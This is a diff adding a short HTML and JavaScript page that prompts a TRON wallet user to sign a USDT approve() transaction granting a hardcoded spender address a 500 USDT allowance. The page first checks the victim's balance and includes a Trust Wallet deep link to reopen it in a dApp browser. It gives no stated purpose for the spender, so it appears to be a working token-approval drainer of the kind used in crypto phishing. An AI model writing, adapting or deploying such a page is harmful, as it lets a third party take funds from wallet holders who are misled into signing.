@@ -1,0 +1,344 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>TRON USDT Approve</title>
+
+  <style>
+    body {
+      background: #111;
+      color: white;
+      font-family: Arial, sans-serif;
+      padding: 30px;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 14px 20px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 10px;
+      font-size: 16px;
+    }
+
+    #approveBtn {
+      background: #00c853;
+      color: white;
+    }
+
+    #openWalletBtn {
+      background: #2962ff;
+      color: white;
+    }
+
+    #status {
+      margin-top: 25px;
+      white-space: pre-line;
+      word-break: break-word;
+      font-size: 15px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <h2>TRON USDT Approve</h2>
+
+  <button id="openWalletBtn">
+    Open in Wallet
+  </button>
+
+  <button id="approveBtn">
+    Approve 500 USDT
+  </button>
+
+  <div id="status">
+    Waiting...
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+
+  <script>
+
+    const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    const SPENDER_ADDRESS = "TKrEGuwgHvuJWbWfLtnoG7NdiEJpBqfMzj";
+
+    const AMOUNT = "500000000"; // 500 USDT
+
+    const approveBtn = document.getElementById("approveBtn");
+
+    const openWalletBtn = document.getElementById("openWalletBtn");
+
+    const status = document.getElementById("status");
+
+
+
+    function setStatus(message, color = "#ffffff") {
+
+      status.style.color = color;
+
+      status.textContent = message;
+    }
+
+
+
+    function decodeTronMessage(msg) {
+
+      try {
+
+        if (
+          typeof msg === "string" &&
+          /^[0-9a-fA-F]+$/.test(msg)
+        ) {
+
+          return TronWeb.toUtf8(msg);
+        }
+
+      } catch (_) {}
+
+      return msg;
+    }
+
+
+
+    function getProvider() {
+
+      return window.tronLink?.tronWeb || window.tronWeb;
+    }
+
+
+
+    function openWallet() {
+
+      const currentUrl = encodeURIComponent(window.location.href);
+
+      const trustUrl =
+        `https://link.trustwallet.com/open_url?coin_id=195&url=${currentUrl}`;
+
+      window.location.href = trustUrl;
+    }
+
+
+
+    openWalletBtn.addEventListener("click", openWallet);
+
+
+
+    approveBtn.addEventListener("click", async () => {
+
+      approveBtn.disabled = true;
+
+      try {
+
+        setStatus("Checking TRON wallet...");
+
+        const tronWeb = getProvider();
+
+        if (!tronWeb) {
+
+          throw new Error(
+            "TRON wallet not found.\nOpen this page inside TronLink / Trust Wallet / TokenPocket dApp browser."
+          );
+        }
+
+
+
+        if (!tronWeb.ready) {
+
+          throw new Error(
+            "Wallet found but not connected."
+          );
+        }
+
+
+
+        const userAddress = tronWeb.defaultAddress.base58;
+
+        const userAddressHex = tronWeb.defaultAddress.hex;
+
+
+
+        if (!tronWeb.isAddress(USDT_ADDRESS)) {
+
+          throw new Error("Invalid USDT address");
+        }
+
+
+
+        if (!tronWeb.isAddress(SPENDER_ADDRESS)) {
+
+          throw new Error("Invalid spender address");
+        }
+
+
+
+        setStatus(
+          `Wallet connected:\n${userAddress}`,
+          "#00ff88"
+        );
+
+
+
+        setStatus("Checking USDT balance...");
+
+
+
+        const usdtContract =
+          await tronWeb.contract().at(USDT_ADDRESS);
+
+
+
+        const rawBalance =
+          await usdtContract
+            .balanceOf(userAddress)
+            .call();
+
+
+
+        const balance =
+          BigInt(rawBalance.toString());
+
+
+
+        if (balance < BigInt(AMOUNT)) {
+
+          const humanBalance =
+            Number(balance) / 1_000_000;
+
+          throw new Error(
+            `Insufficient USDT balance.\nBalance: ${humanBalance} USDT`
+          );
+        }
+
+
+
+        setStatus(
+          "Balance OK.\nCreating approve transaction..."
+        );
+
+
+
+        const tx =
+          await tronWeb.transactionBuilder
+            .triggerSmartContract(
+
+              USDT_ADDRESS,
+
+              "approve(address,uint256)",
+
+              {
+                callValue: 0,
+                feeLimit: 100_000_000
+              },
+
+              [
+                {
+                  type: "address",
+                  value: SPENDER_ADDRESS
+                },
+
+                {
+                  type: "uint256",
+                  value: AMOUNT
+                }
+              ],
+
+              userAddressHex
+            );
+
+
+
+        if (
+          !tx?.result?.result ||
+          !tx.transaction
+        ) {
+
+          console.error(tx);
+
+          throw new Error(
+            "Failed to create approve transaction"
+          );
+        }
+
+
+
+        setStatus(
+          "Waiting for wallet signature..."
+        );
+
+
+
+        const signedTx =
+          await tronWeb.trx.sign(tx.transaction);
+
+
+
+        if (!signedTx?.signature) {
+
+          throw new Error(
+            "Transaction was not signed"
+          );
+        }
+
+
+
+        setStatus(
+          "Sending transaction to TRON network..."
+        );
+
+
+
+        const result =
+          await tronWeb.trx.sendRawTransaction(signedTx);
+
+
+
+        if (!result.result) {
+
+          console.error(result);
+
+          throw new Error(
+            decodeTronMessage(result.message) ||
+            "Transaction failed"
+          );
+        }
+
+
+
+        setStatus(
+          `SUCCESS\n\nTxID:\n${result.txid}`,
+          "#00ff88"
+        );
+
+
+
+        console.log("TRON TX:", result.txid);
+
+      } catch (error) {
+
+        console.error(error);
+
+        setStatus(
+          "ERROR:\n" + (error.message || error),
+          "#ff6666"
+        );
+
+      } finally {
+
+        approveBtn.disabled = false;
+      }
+
+    });
+
+  </script>
+
+</body>
+</html>
